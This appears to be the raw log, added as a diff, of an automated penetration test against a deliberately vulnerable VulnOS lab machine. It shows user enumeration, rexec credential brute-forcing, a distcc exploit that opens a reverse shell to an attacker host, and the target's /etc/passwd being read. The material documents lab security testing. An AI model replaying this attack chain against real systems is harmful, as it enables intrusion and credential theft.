+[*] 192.168.1.141 USER=nobody RID=501
+[*] 192.168.1.141 GROUP=None RID=513
+[*] 192.168.1.141 USER=vulnosadmin RID=3000
+[*] 192.168.1.141 USER=sysadmin RID=3002
+[*] 192.168.1.141 USER=webmin RID=3004
+[*] 192.168.1.141 USER=hackme RID=3006
+[*] 192.168.1.141 USER=sa RID=3008
+[*] 192.168.1.141 USER=stupiduser RID=3010
+[*] 192.168.1.141 USER=ftp RID=3012
+[*] 192.168.1.141 VULNOS [nobody, vulnosadmin, sysadmin, webmin, hackme, sa, stupiduser, ftp ]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141: - The target appears to be running Samba.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141:445 could not be identified: Unix (Samba 3.4.7)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+RHOST => 192.168.1.141
+[*] Started reverse handler on 192.168.1.149:4444 
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Exploit completed, but no session was created.
+RHOSTS => 192.168.1.141
+RHOST => 192.168.1.141
+[*] 192.168.1.141:445 - The target is not exploitable.
++ -- --=[Port 162 closed... skipping.
++ -- --=[Port 389 closed... skipping.
++ -- --=[Port 443 closed... skipping.
++ -- --=[Port 445 opened... running tests...
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec 28 11:07:43 2015
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.1.141
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 192.168.1.141    |
+ ===================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================= 
+|    Nbtstat Information for 192.168.1.141    |
+ ============================================= 
+Looking up status of 192.168.1.141
+	VULNOS          <00> -         B <ACTIVE>  Workstation Service
+	VULNOS          <03> -         B <ACTIVE>  Messenger Service
+	VULNOS          <20> -         B <ACTIVE>  File Server Service
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+
+	MAC Address = 00-00-00-00-00-00
+
+ ====================================== 
+|    Session Check on 192.168.1.141    |
+ ====================================== 
+[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+Traceback (most recent call last):
+  File "bin/samrdump.py", line 21, in <module>
+    from impacket.examples import logger
+ImportError: cannot import name logger
+Doing NBT name scan for addresses from 192.168.1.141
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.1.141    VULNOS           <server>  VULNOS           00:00:00:00:00:00
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:07 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00022s latency).
+PORT    STATE SERVICE     VERSION
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb-mbenum: 
+|_  ERROR: Failed to connect to browser service: SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
+|_smb-print-text: false
+| smb-psexec: Can't find the service file: nmap_service.exe (or nmap_service).
+| Due to false positives in antivirus software, this module is no
+| longer included by default. Please download it from
+| https://nmap.org/psexec/nmap_service.exe
+|_and place it in nselib/data/psexec/ under the Nmap DATADIR.
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
+                                                  
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .
+                ',@@     @   ;           _____________
+                 (   3 C    )     /|___ / Metasploit! \
+                 ;@'. __*__,."    \|--- \_____________/
+                  '(.,...."/
+
+
+Save 45% of your time on large engagements with Metasploit Pro
+Learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[-] 192.168.1.141:445 - Error runing query against HKU. Rex::Proto::DCERPC::Exceptions::BindError. Failed to bind. Could not bind to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.141[\svcctl]
+[*] 192.168.1.141:445 - Executing cleanup
+[-] 192.168.1.141:445 - Unable to processes cleanup commands: Failed to bind. Could not bind to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.141[\svcctl]
+[!] 192.168.1.141:445 - Maybe %SYSTEMDRIVE%\WINDOWS\Temp\BdCieOqvZeOgAOMf.txt must be deleted manually
+[!] 192.168.1.141:445 - Maybe %SYSTEMDRIVE%\WINDOWS\Temp\JcHJNboMEolFWPSY.bat must be deleted manually
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] Connecting to the server...
+[*] Mounting the remote share \\192.168.1.141\SYSVOL'...
+[-] 192.168.1.141: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: 0x00430001 (Command=117 WordCount=0)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[+] 192.168.1.141:139 - print$ - (DISK) Printer Drivers
+[+] 192.168.1.141:139 - IPC$ - (IPC) IPC Service (VulnOS server (Samba
+[+] Ubuntu))
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141 VULNOS [ stupiduser, ftp, nobody, sysadmin, vulnosadmin, webmin, hackme, sa ] ( LockoutTries=0 PasswordMin=5 )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+UUID 6bffd098-a112-3610-9833-46c3f87e345a 1.0 ERROR Failed to bind. Could not bind to 6bffd098-a112-3610-9833-46c3f87e345a:1.0@ncacn_np:192.168.1.141[\wkssvc]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141:445 SMB - Starting SMB login bruteforce
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141 PIPE(LSARPC) LOCAL(VULNOS - 5-21-943354670-1599095473-2771928314) DOMAIN(WORKGROUP - )
+[*] 192.168.1.141 USER=nobody RID=501
+[*] 192.168.1.141 GROUP=None RID=513
+[*] 192.168.1.141 USER=vulnosadmin RID=3000
+[*] 192.168.1.141 USER=sysadmin RID=3002
+[*] 192.168.1.141 USER=webmin RID=3004
+[*] 192.168.1.141 USER=hackme RID=3006
+[*] 192.168.1.141 USER=sa RID=3008
+[*] 192.168.1.141 USER=stupiduser RID=3010
+[*] 192.168.1.141 USER=ftp RID=3012
+[*] 192.168.1.141 VULNOS [nobody, vulnosadmin, sysadmin, webmin, hackme, sa, stupiduser, ftp ]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141: - The target appears to be running Samba.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141:445 could not be identified: Unix (Samba 3.4.7)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+RHOST => 192.168.1.141
+[*] Started reverse handler on 192.168.1.149:4444 
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Trying return address 0x081ed5f2...
+[*] Exploit completed, but no session was created.
+RHOSTS => 192.168.1.141
+RHOST => 192.168.1.141
+[*] 192.168.1.141:445 - The target is not exploitable.
++ -- --=[Port 512 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:09 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00033s latency).
+PORT    STATE SERVICE VERSION
+512/tcp open  exec    netkit-rsh rexecd
+| rexec-brute: 
+|   Accounts: 
+|     admin:admin - Valid credentials
+|     web:<empty> - Valid credentials
+|     test:<empty> - Valid credentials
+|     root:123456 - Valid credentials
+|     webadmin:123456 - Valid credentials
+|     user:user - Valid credentials
+|     netadmin:netadmin - Valid credentials
+|     guest:guest - Valid credentials
+|     administrator:administrator - Valid credentials
+|     sysadmin:123456 - Valid credentials
+|_  Statistics: Performed 19 guesses in 5 seconds, average tps: 3
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.93 seconds
++ -- --=[Port 513 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:09 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00012s latency).
+PORT    STATE SERVICE VERSION
+513/tcp open  login
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
++ -- --=[Port 514 opened... running tests...
+amap v5.4 (www.thc.org/thc-amap) started at 2015-12-28 11:09:51 - APPLICATION MAPPING mode
+
+
+Unidentified ports: 192.168.1.141:514/tcp (total 1).
+
+amap v5.4 finished at 2015-12-28 11:09:57
++ -- --=[Port 514 opened... running tests...
+amap v5.4 (www.thc.org/thc-amap) started at 2015-12-28 11:09:57 - APPLICATION MAPPING mode
+
+
+Unidentified ports: 192.168.1.141:1524/tcp (total 1).
+
+amap v5.4 finished at 2015-12-28 11:09:57
++ -- --=[Port 2049 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:09 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00018s latency).
+PORT     STATE SERVICE VERSION
+2049/tcp open  nfs     2-4 (RPC #100003)
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
+   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  45297  status
+    100024    1   tcp  51775  status
+    100021    1   udp  51332  nlockmgr
+    100021    3   udp  51332  nlockmgr
+    100021    4   udp  51332  nlockmgr
+    100021    1   tcp  47875  nlockmgr
+    100021    3   tcp  47875  nlockmgr
+    100021    4   tcp  47875  nlockmgr
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100005    1   udp  44465  mountd
+    100005    1   tcp  57008  mountd
+    100005    2   udp  44465  mountd
+    100005    2   tcp  57008  mountd
+    100005    3   udp  44465  mountd
+    100005    3   tcp  57008  mountd
+Export list for 192.168.1.141:
+Server requested PLAINTEXT password but 'client plaintext auth = no' or 'client ntlmv2 auth = yes'
+session setup failed: NT_STATUS_ACCESS_DENIED
++ -- --=[Port 2121 closed... skipping.
++ -- --=[Port 3306 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:10 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00017s latency).
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.1.73-0ubuntu0.10.04.1
+| mysql-brute: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 1 guesses in 11 seconds, average tps: 0
+|_mysql-empty-password: ERROR: Script execution failed (use -d to debug)
+| mysql-enum: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 0 guesses in 5 seconds, average tps: 0
+| mysql-info: 
+|   Protocol: 53
+|   Version: .1.73-0ubuntu0.10.04.1
+|   Thread ID: 340
+|   Capabilities flags: 63487
+|   Some Capabilities: DontAllowDatabaseTableColumn, LongColumnFlag, LongPassword, ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, SupportsTransactions, FoundRows, IgnoreSigpipes
+|   Status: Autocommit
+|_  Salt: h()7voLlY[>`M=+_}xb`
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.03 seconds
++ -- --=[Port 3389 closed... skipping.
++ -- --=[Port 3632 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:10 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00018s latency).
+PORT     STATE SERVICE VERSION
+3632/tcp open  distccd distccd v1 ((Ubuntu 4.4.3-4ubuntu5.1) 4.4.3)
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=104(distccd) gid=65534(nogroup) groups=65534(nogroup)
+|   
+|     References:
+|       http://http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2004-2687
+|       http://http://www.osvdb.org/13378
+|       http://distcc.googlecode.com/svn/trunk/doc/web/security.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                        http://metasploit.pro |
+|______________________________________________________________________________|
+
+
+Trouble managing data? List, sort, group, tag and search your pentest data
+in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOST => 192.168.1.141
+RHOSTS => 192.168.1.141
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo sEK53rE1tjXPxJWl;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "sEK53rE1tjXPxJWl\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.1.149:4444 -> 192.168.1.141:36487) at 2015-12-28 11:10:49 -0500
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+landscape:x:102:108::/var/lib/landscape:/bin/false
+vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
+sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+webmin:x:1002:1002::/home/webmin:/bin/sh
+hackme:x:1003:1003::/home/hackme:/bin/sh
+sa:x:1004:1004::/home/sa:/bin/sh
+stupiduser:x:1005:1005::/home/stupiduser:/bin/sh
+messagebus:x:103:112::/var/run/dbus:/bin/false
+distccd:x:104:65534::/:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+openldap:x:106:113:OpenLDAP Server Account,,,:/nonexistent:/bin/false
+ftp:x:1006:1006::/home/ftp:/bin/sh
+mysql:x:107:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+telnetd:x:108:116::/nonexistent:/bin/false
+bind:x:109:117::/var/cache/bind:/bin/false
+postgres:x:110:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+postfix:x:111:119::/var/spool/postfix:/bin/false
+dovecot:x:112:121:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+tomcat6:x:113:122::/usr/share/tomcat6:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+snmp:x:115:123::/var/lib/snmp:/bin/false
+nagios:x:116:124::/var/lib/nagios:/bin/false
+openerp:x:117:125:Open ERP server,,,:/home/openerp:/bin/false
+^C
+Abort session 1? [y/N]  y
+
+[*] 192.168.1.141 - Command shell session 1 closed.  Reason: User exit
++ -- --=[Port 5432 closed... skipping.
++ -- --=[Port 5800 closed... skipping.
++ -- --=[Port 5900 closed... skipping.
++ -- --=[Port 6000 closed... skipping.
++ -- --=[Port 6667 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:11 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00030s latency).
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     IRCnet ircd
+| irc-info: 
+|   users: 1
+|   servers: 1
+|   chans: 15
+|   lusers: 1
+|   lservers: 0
+|   server: irc.localhost
+|   version: 2.11.2p1. irc.localhost 000A 
+|   uptime: 0 days, 0:44:13
+|   source ident: NONE or BLOCKED
+|   source host: 192.168.1.149
+|_  error: Closing Link: jikcenmfv[~nmap@192.168.1.149] ("")
+| irc-sasl-brute: 
+|   Accounts: No valid accounts found
+|   Statistics: Performed 2 guesses in 60 seconds, average tps: 0
+|_  ERROR: Too many retries, aborted ...
+|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+Service Info: Host: irc.localhost
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 152.08 seconds
++ -- --=[Port 8000 closed... skipping.
++ -- --=[Port 8100 closed... skipping.
++ -- --=[Port 8080 opened... running tests...
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/  
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/    
+                                <   
+                                 ...'
+                                 
+    WAFW00F - Web Application Firewall Detection Tool
+    
+    By Sandro Gauci && Wendel G. Henrique
+
+Checking http://192.168.1.141:8080
+Generic Detection results:
+No WAF detected by the generic detection
+Number of requests: 13
+
+http://192.168.1.141:8080 [200] Apache, Apache-Tomcat, Country[RESERVED][ZZ], HTTPServer[Apache-Coyote/1.1], IP[192.168.1.141], Title[Apache Tomcat]
+
+
+	__  ______ _____ 
+	\ \/ / ___|_   _|
+	 \  /\___ \ | |  
+	 /  \ ___) || |  
+	/_/\_|____/ |_|  
+
++ -- --=[Cross-Site Tracer v1.3 by 1N3 @ CrowdShield
++ -- --=[Target: 192.168.1.141:8080
++ -- --=[Site not vulnerable to Cross-Site Tracing!
++ -- --=[Site not vulnerable to host header injection!
++ -- --=[Site vulnerable to Cross-Frame Scripting!
++ -- --=[Site vulnerable to Clickjacking!
+
+HTTP/1.1 405 Method Not Allowed
+Server: Apache-Coyote/1.1
+Allow: POST, GET, DELETE, OPTIONS, PUT, HEAD
+Content-Length: 0
+Date: Mon, 28 Dec 2015 16:13:46 GMT
+
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Accept-Ranges: bytes
+ETag: W/"1887-1394395959000"
+Last-Modified: Sun, 09 Mar 2014 20:12:39 GMT
+Content-Type: text/html
+Content-Length: 1887
+Date: Mon, 28 Dec 2015 16:13:46 GMT
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+    <title>Apache Tomcat</title>
+</head>
+
+<body>
+<h1>It works !</h1>
+
+<p>If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!</p>
+ 
+<p>This is the default Tomcat home page. It can be found on the local filesystem at: <code>/var/lib/tomcat6/webapps/ROOT/index.html</code></p>
+
+<p>Tomcat6 veterans might be pleased to learn that this system instance of Tomcat is installed with <code>CATALINA_HOME</code> in <code>/usr/share/tomcat6</code> and <code>CATALINA_BASE</code> in <code>/var/lib/tomcat6</code>, followin
+
+
+Version: 1.10.5-static
+OpenSSL 1.0.2e-dev xx XXX xxxx
+
+Testing SSL server 192.168.1.141 on port 8080
+
+  TLS renegotiation:
+Session renegotiation not supported
+
+  TLS Compression:
+Compression disabled
+
+  Heartbleed:
+TLS 1.0 not vulnerable to heartbleed
+TLS 1.1 not vulnerable to heartbleed
+TLS 1.2 not vulnerable to heartbleed
+
+  Supported Server Cipher(s):
+
+  Preferred Server Cipher(s):
+
+Failed to connect to get certificate.
+Most likley cause is server not supporting unknown SSL_METHOD, try manually specifying version
+ ███▄ ▄███▓ ▄▄▄        ██████   ██████  ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄ 
+▓██▒▀█▀ ██▒▒████▄    ▒██    ▒ ▒██    ▒ ▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌
+▓██    ▓██░▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌
+▒██    ▒██ ░██▄▄▄▄██   ▒   ██▒  ▒   ██▒▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌
+▒██▒   ░██▒ ▓█   ▓██▒▒██████▒▒▒██████▒▒░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓ 
+░ ▒░   ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒ 
+░  ░      ░  ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒ 
+░      ░     ░   ▒   ░  ░  ░  ░  ░  ░   ░    ░   ░ ░      ░      ░    ░ ░  ░ 
+       ░         ░  ░      ░        ░   ░          ░  ░   ░  ░   ░  ░   ░    
+                                             ░                        ░      
++ -- --=[MÄŚŚBĻËËĐ V20151115 BŸ 1Ņ3 @ ĊŖÖŴĐŚȞÏËĻĐ - https://crowdshield.com
++ -- --=[Checking for HeartBleed: 192.168.1.141:8080
++ -- --=[Checking for OpenSSL CCS: 192.168.1.141:8080
+FAIL Remote host is affected
++ -- --=[Checking for Poodle (SSLv3): 192.168.1.141:8080
++ -- --=[Scan Complete!
